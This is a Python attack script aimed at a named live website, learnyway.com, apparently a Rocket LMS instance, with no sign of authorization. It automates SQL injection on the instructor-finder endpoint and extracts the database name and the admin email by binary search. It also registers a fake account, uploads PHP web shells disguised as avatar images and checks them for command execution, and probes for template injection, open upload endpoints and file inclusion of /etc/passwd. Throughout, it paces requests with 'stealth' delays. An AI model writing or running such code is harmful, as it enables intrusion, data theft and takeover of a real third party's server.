"""
LEARNYWAY.COM - UNAUTHENTICATED EXPLOIT
========================================

Target: learnyway.com (Rocket LMS instance)
Access: NO ADMIN - External/Public exploitation only

KNOWN VULNERABILITIES (from source code):
1. SQLi at /instructor-finder?min_age=X (InstructorFinderController.php:397)
2. Public search forms
3. User registration + profile upload
4. Public file endpoints

EXPLOITATION STRATEGY:
1. Confirm SQLi works on this target
2. Extract database credentials via SQLi
3. Try public file upload vectors
4. Exploit via user registration (create account, upload malicious avatar)
5. SSTI in public forms
"""

import requests
import re
import time
import random
import string
import urllib.parse

BASE_URL = "https://learnyway.com"
HOST = "learnyway.com"

session = requests.Session()
session.timeout = 30

def stealth_delay():
    time.sleep(random.uniform(0.5, 1))

def check_site():
    """Check if site is alive and running Rocket LMS"""
    print("\n" + "="*60)
    print("    TARGET RECONNAISSANCE")
    print("="*60)
    
    try:
        r = session.get(BASE_URL, timeout=10)
        print(f"[*] Status: {r.status_code}")
        print(f"[*] Length: {len(r.text)}")
        
        # Check for Rocket LMS indicators
        indicators = [
            ("Rocket LMS", "rocket"),
            ("Laravel", "laravel"),
            ("instructor-finder", "instructor-finder"),
            ("/store/", "store"),
            ("webinar", "webinar"),
        ]
        
        for name, pattern in indicators:
            if pattern.lower() in r.text.lower():
                print(f"    [+] Found: {name}")
        
        # Get CSRF token if available
        csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
        if csrf:
            print(f"    [+] CSRF Token found")
            return csrf.group(1)
        
        return None
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# ============================================
# VULNERABILITY 1: SQL INJECTION
# ============================================

def test_sqli():
    """Test SQL Injection at /instructor-finder"""
    print("\n" + "="*60)
    print("    SQL INJECTION TEST")
    print("="*60)
    
    # Test if endpoint exists
    r = session.get(f"{BASE_URL}/instructor-finder")
    print(f"[*] /instructor-finder exists: {r.status_code}")
    
    if r.status_code != 200:
        # Try alternative endpoints
        alternatives = [
            "/instructors",
            "/teachers",
            "/find-instructor",
            "/search",
        ]
        
        for alt in alternatives:
            r = session.get(f"{BASE_URL}{alt}")
            if r.status_code == 200:
                print(f"[+] Found alternative: {alt}")
                break
    
    # Baseline request
    print("\n[*] Testing SQLi payloads...")
    
    baseline = session.get(f"{BASE_URL}/instructor-finder")
    baseline_len = len(baseline.text)
    print(f"    Baseline length: {baseline_len}")
    
    payloads = [
        # Boolean-based
        ("1 AND 1=1", "TRUE condition", "equal_or_more"),
        ("1 AND 1=2", "FALSE condition", "less"),
        
        # Time-based
        ("1 AND SLEEP(3)", "Time-based (3s)", "time"),
        
        # Error-based
        ("1'", "Single quote error", "error"),
        ("1 UNION SELECT NULL", "UNION test", "equal_or_more"),
        
        # UNION data extraction
        ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL", "UNION 5 cols", "equal_or_more"),
        ("1 UNION SELECT database(),2,3,4,5", "Extract DB name", "equal_or_more"),
    ]
    
    for payload, desc, expected in payloads:
        stealth_delay()
        
        try:
            start = time.time()
            r = session.get(f"{BASE_URL}/instructor-finder", params={"min_age": payload})
            elapsed = time.time() - start
            
            result_len = len(r.text)
            diff = result_len - baseline_len
            
            indicator = ""
            if expected == "time" and elapsed >= 3:
                indicator = "[!!!] TIME-BASED SQLi CONFIRMED!"
            elif expected == "equal_or_more" and diff > 100:
                indicator = "[+] Response varies"
            elif expected == "less" and diff < -100:
                indicator = "[+] FALSE condition confirmed"
            elif expected == "error" and ("error" in r.text.lower() or "sql" in r.text.lower()):
                indicator = "[!] SQL error in response"
            
            print(f"    {desc}: Status {r.status_code}, Len {result_len}, Diff {diff:+d}, Time {elapsed:.1f}s {indicator}")
            
            if "[!!!]" in indicator:
                return True
                
        except Exception as e:
            print(f"    {desc}: Error - {e}")
    
    return False

def extract_data_via_sqli():
    """Extract database information via SQLi"""
    print("\n" + "="*60)
    print("    SQLi DATA EXTRACTION")
    print("="*60)
    
    # Binary search extraction
    def binary_search_char(position, table_query=None):
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            if table_query:
                # Extract from specific query
                payload = f"1 AND ASCII(SUBSTR(({table_query}),{position},1))>{mid}"
            else:
                # Extract database name
                payload = f"1 AND ASCII(SUBSTR(database(),{position},1))>{mid}"
            
            r = session.get(f"{BASE_URL}/instructor-finder", params={"min_age": payload})
            
            # Determine TRUE/FALSE based on response length
            if len(r.text) > 150000:  # TRUE condition threshold
                low = mid + 1
            else:
                high = mid - 1
        
        return chr(low) if 32 <= low <= 126 else None
    
    # Extract database name
    print("\n[*] Extracting database name...")
    db_name = ""
    
    for i in range(1, 30):
        char = binary_search_char(i)
        if char is None or char == " ":
            break
        db_name += char
        print(f"\r    Database: {db_name}", end="", flush=True)
        stealth_delay()
    
    print(f"\n    [+] Database: {db_name}")
    
    # Extract admin user
    print("\n[*] Extracting admin email...")
    admin_query = "SELECT email FROM users WHERE id=1"
    admin_email = ""
    
    for i in range(1, 50):
        char = binary_search_char(i, admin_query)
        if char is None or char == " ":
            break
        admin_email += char
        print(f"\r    Admin Email: {admin_email}", end="", flush=True)
        stealth_delay()
    
    print(f"\n    [+] Admin Email: {admin_email}")
    
    return db_name, admin_email

# ============================================
# VULNERABILITY 2: REGISTRATION EXPLOIT
# ============================================

def register_and_exploit():
    """Register account and try to upload malicious files"""
    print("\n" + "="*60)
    print("    REGISTRATION + FILE UPLOAD EXPLOIT")
    print("="*60)
    
    # Generate random credentials
    random_str = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"test{random_str}@example.com"
    password = "Test123456!"
    name = f"Tester{random_str}"
    
    print(f"[*] Attempting registration with: {email}")
    
    # Get registration page
    r = session.get(f"{BASE_URL}/register")
    
    if r.status_code != 200:
        print(f"[-] Registration page not found: {r.status_code}")
        return False
    
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
    if not csrf:
        print("[-] No CSRF token found")
        return False
    
    # Register
    register_data = {
        "_token": csrf.group(1),
        "full_name": name,
        "email": email,
        "password": password,
        "password_confirmation": password,
        "mobile": "1234567890",
    }
    
    r = session.post(f"{BASE_URL}/register", data=register_data)
    print(f"    Registration response: {r.status_code}")
    
    if r.status_code == 200 or r.status_code == 302:
        print(f"[+] Registration might be successful!")
        
        # Try to login
        r = session.get(f"{BASE_URL}/login")
        csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
        
        if csrf:
            login_data = {
                "_token": csrf.group(1),
                "email": email,
                "password": password,
            }
            r = session.post(f"{BASE_URL}/login", data=login_data)
            
            if "/panel" in r.url or "/dashboard" in r.url:
                print("[+] Logged in successfully!")
                
                # Now try to upload malicious file via profile
                return exploit_profile_upload()
    
    return False

def exploit_profile_upload():
    """Upload malicious file via user profile"""
    print("\n[*] Attempting malicious file upload via profile...")
    
    shell = "<?php system($_GET['c']); ?>"
    
    # Get panel page for CSRF
    r = session.get(f"{BASE_URL}/panel/setting")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
    
    if not csrf:
        print("[-] Cannot access panel")
        return False
    
    # File upload attempts
    uploads = [
        ("avatar", "shell.php", shell.encode(), "image/jpeg"),
        ("avatar", "shell.php.jpg", shell.encode(), "image/jpeg"),
        ("avatar", "shell.phtml", shell.encode(), "image/jpeg"),
        ("image", "shell.gif", b"GIF89a" + shell.encode(), "image/gif"),
    ]
    
    for field, filename, content, mime in uploads:
        print(f"    Trying: {filename} via {field}")
        
        files = {field: (filename, content, mime)}
        data = {"_token": csrf.group(1)}
        
        r = session.post(f"{BASE_URL}/panel/setting", files=files, data=data)
        
        if r.status_code not in [403, 419]:
            print(f"    [!] Upload returned: {r.status_code}")
            
            # Check for shell
            shell_paths = [
                f"/storage/{filename}?c=id",
                f"/uploads/{filename}?c=id",
                f"/avatars/{filename}?c=id",
            ]
            
            for path in shell_paths:
                check = session.get(f"{BASE_URL}{path}")
                if "uid=" in check.text:
                    print(f"\n[!!!] RCE SUCCESS! Shell: {BASE_URL}{path}")
                    return True
        
        stealth_delay()
    
    return False

# ============================================
# VULNERABILITY 3: PUBLIC FORM SSTI
# ============================================

def test_public_ssti():
    """Test SSTI in public forms"""
    print("\n" + "="*60)
    print("    PUBLIC FORM SSTI TEST")
    print("="*60)
    
    # Public forms to test
    forms = [
        ("/contact", ["name", "email", "message"]),
        ("/newsletter", ["email"]),
        ("/search", ["search", "q", "query"]),
        ("/instructors", ["search"]),
    ]
    
    ssti_payload = "{{7*7}}"
    
    for endpoint, fields in forms:
        print(f"\n[*] Testing: {endpoint}")
        
        # Get CSRF
        try:
            r = session.get(f"{BASE_URL}{endpoint}")
            csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
            
            if r.status_code != 200:
                print(f"    Endpoint returned: {r.status_code}")
                continue
            
            # Test each field
            for field in fields:
                data = {field: ssti_payload}
                if csrf:
                    data["_token"] = csrf.group(1)
                
                r = session.post(f"{BASE_URL}{endpoint}", data=data)
                
                if "49" in r.text and "{{7*7}}" not in r.text:
                    print(f"    [!!!] SSTI CONFIRMED on {field}!")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# VULNERABILITY 4: PUBLIC FILE ENDPOINTS
# ============================================

def test_public_file_endpoints():
    """Test for public file upload/access vulnerabilities"""
    print("\n" + "="*60)
    print("    PUBLIC FILE ENDPOINTS TEST")
    print("="*60)
    
    # Common public endpoints that might accept files
    endpoints = [
        "/api/upload",
        "/api/files/upload",
        "/upload",
        "/files/upload",
        "/api/v1/upload",
        "/storage/upload",
    ]
    
    shell = "<?php system($_GET['c']); ?>"
    
    for endpoint in endpoints:
        print(f"\n[*] Testing: {endpoint}")
        
        try:
            files = {"file": ("test.php", shell.encode(), "application/x-php")}
            r = session.post(f"{BASE_URL}{endpoint}", files=files)
            
            print(f"    Status: {r.status_code}")
            
            if r.status_code not in [403, 404, 405, 419]:
                print(f"    [!] Interesting response!")
                print(f"    Body: {r.text[:200]}")
                
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# VULNERABILITY 5: LFI ENDPOINTS
# ============================================

def test_public_lfi():
    """Test for LFI in public endpoints"""
    print("\n" + "="*60)
    print("    PUBLIC LFI TEST")
    print("="*60)
    
    lfi_params = [
        ("file", "/etc/passwd"),
        ("page", "../../../etc/passwd"),
        ("view", "/etc/passwd"),
        ("template", "../../../etc/passwd"),
        ("include", "/etc/passwd"),
        ("lang", "../../../../etc/passwd"),
    ]
    
    endpoints = [
        f"{BASE_URL}/?{{param}}={{value}}",
        f"{BASE_URL}/page?{{param}}={{value}}",
        f"{BASE_URL}/download?{{param}}={{value}}",
    ]
    
    for param, value in lfi_params:
        for endpoint_template in endpoints:
            endpoint = endpoint_template.replace("{param}", param).replace("{value}", urllib.parse.quote(value))
            
            try:
                r = session.get(endpoint, timeout=10)
                
                if "root:" in r.text:
                    print(f"[!!!] LFI FOUND!")
                    print(f"    URL: {endpoint}")
                    return True
                    
            except:
                pass
    
    print("[-] No public LFI found")
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       LEARNYWAY.COM - UNAUTHENTICATED EXPLOIT                ║
║       Target: learnyway.com (Rocket LMS)                     ║
║       Access: NO ADMIN - External only                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Recon
    csrf = check_site()
    
    # Test SQLi
    if test_sqli():
        print("\n[+] SQLi confirmed! Extracting data...")
        extract_data_via_sqli()
    
    # Test public SSTI
    test_public_ssti()
    
    # Test public file endpoints
    test_public_file_endpoints()
    
    # Test LFI
    test_public_lfi()
    
    # Try registration exploit
    register_and_exploit()
    
    print("\n" + "="*60)
    print("    EXPLOITATION COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
